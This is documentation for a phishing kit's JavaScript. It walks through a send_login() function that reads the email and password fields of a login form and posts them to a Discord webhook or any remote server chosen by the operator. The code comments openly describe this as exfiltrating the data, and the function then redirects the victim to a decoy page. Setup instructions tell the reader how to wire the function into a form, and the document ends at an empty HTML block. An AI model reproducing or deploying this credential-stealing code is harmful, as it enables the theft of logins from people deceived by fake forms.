# JavaScript/HTML Documentation

- This JavaScript code aims to send the credentials entered in an HTML form to a Discord Webhook or any other remote server. The code is written as an asynchronous function named **send_login()**, which is called when the user presses the login button in the HTML form.
```JavaScript
async function send_login() {
    // ...
}
```

- The first thing the code does is to set the **discord_webhook_url** constant to the Discord Webhook URL where the message containing the credentials will be sent. Then, the **email** and **password** values are retrieved from the form input fields using their **id** attributes.
```JavaScript
    // SET YOUR DISCORD WEBHOOK or whatever you want to exfiltrate the data
    const discord_webhook_url = "https://discord.com/api/webhooks/123/abc";

    // Retrieve data from POST form
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
```

- After that, a **message** variable is created by concatenating the **email** and **password** values. This message will be sent to the Discord Webhook.
```JavaScript
    // Create message content
    const message = "Email: " + email + " \n " + "Password: " + password;
```

- The **fetch()** method is used to send an HTTP POST request to the Discord Webhook URL. The request body is a JSON object that contains the **message** content. If the response status is **ok**, the user is redirected to the specified URL, which is set in the **window.location.href** property. Otherwise, a generic error is thrown.
```JavaScript
    // Send POST request to Discord webhook URL
    const response = await fetch(discord_webhook_url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: message })
    });
    if (response.ok) {
        // DEFINE the redirect link preferred
        window.location.href = "https://www.example.com";
    } else {
        // Otherwise, throw a generic error
        throw new Error('Generic error!');
```

- If an error occurs during the execution of the **fetch()** method, it will be caught by the **catch()** block and logged to the console using the **console.error()** method.
```JavaScript
    try{
        // ...
    } catch (error) {
        // Log any errors to the console
        console.error(error);
    }
```

- To use this code, you need to replace the **discord_webhook_url** constant with the actual Discord Webhook URL or the URL of any other remote server that you want to send the message to. You also need to ensure that the **id** attributes of the email and password input fields in the HTML form match the values used in the **getElementById()** method calls. Finally, you need to call the **send_login()** function when the user submits the form.
```HTML